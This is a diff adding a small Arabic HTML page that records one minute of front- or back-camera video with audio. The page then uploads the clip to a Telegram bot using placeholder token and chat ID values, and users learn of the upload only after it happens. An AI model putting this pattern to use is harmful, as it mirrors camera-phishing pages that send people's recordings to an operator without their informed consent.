@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل فيديو بالكاميرا الأمامية والخلفية</title>
+</head>
+<body>
+    <h1>تسجيل فيديو بالكاميرا</h1>
+    <button id="frontCamera">الكاميرا الأمامية</button>
+    <button id="backCamera">الكاميرا الخلفية</button>
+    <p>اضغط على أحد الأزرار لاختيار الكاميرا التي ترغب باستخدامها.</p>
+    <div id="videoContainer"></div>
+    <script>
+        function startRecording(facingMode) {
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                navigator.mediaDevices.getUserMedia({
+                    video: { facingMode }, // تحديد الكاميرا الأمامية أو الخلفية
+                    audio: true
+                })
+                .then(stream => {
+                    const videoContainer = document.getElementById('videoContainer');
+                    videoContainer.innerHTML = ""; // إزالة أي فيديو سابق
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.play();
+                    video.style.width = "100%";
+                    videoContainer.appendChild(video);
+
+                    const mediaRecorder = new MediaRecorder(stream);
+                    const chunks = [];
+
+                    mediaRecorder.ondataavailable = event => {
+                        if (event.data.size > 0) {
+                            chunks.push(event.data);
+                        }
+                    };
+
+                    mediaRecorder.onstop = () => {
+                        const blob = new Blob(chunks, { type: 'video/webm' });
+                        const formData = new FormData();
+                        formData.append('video', blob, 'recording.webm');
+
+                        const telegramBotToken = 'YOUR_TELEGRAM_BOT_TOKEN'; // أدخل رمز البوت
+                        const chatId = 'YOUR_CHAT_ID'; // أدخل معرف الدردشة
+
+                        fetch(`https://api.telegram.org/bot${telegramBotToken}/sendVideo?chat_id=${chatId}`, {
+                            method: 'POST',
+                            body: formData
+                        })
+                        .then(response => response.json())
+                        .then(data => {
+                            console.log("تم إرسال الفيديو بنجاح:", data);
+                            alert("تم إرسال الفيديو إلى Telegram بنجاح!");
+                        })
+                        .catch(error => {
+                            console.error("حدث خطأ أثناء إرسال الفيديو:", error);
+                            alert("حدث خطأ أثناء إرسال الفيديو.");
+                        });
+                    };
+
+                    mediaRecorder.start();
+
+                    setTimeout(() => {
+                        mediaRecorder.stop();
+                        stream.getTracks().forEach(track => track.stop());
+                    }, 1 * 60 * 1000); // مدة التسجيل دقيقة واحدة
+                })
+                .catch(error => {
+                    console.error("خطأ أثناء الوصول إلى الكاميرا:", error);
+                    alert("لا يمكن الوصول إلى الكاميرا.");
+                });
+            } else {
+                alert("متصفحك لا يدعم ميزات الوصول إلى الكاميرا.");
+            }
+        }
+
+        document.getElementById('frontCamera').addEventListener('click', () => startRecording('user'));
+        document.getElementById('backCamera').addEventListener('click', () => startRecording('environment'));
+    </script>
+</body>
+</html>
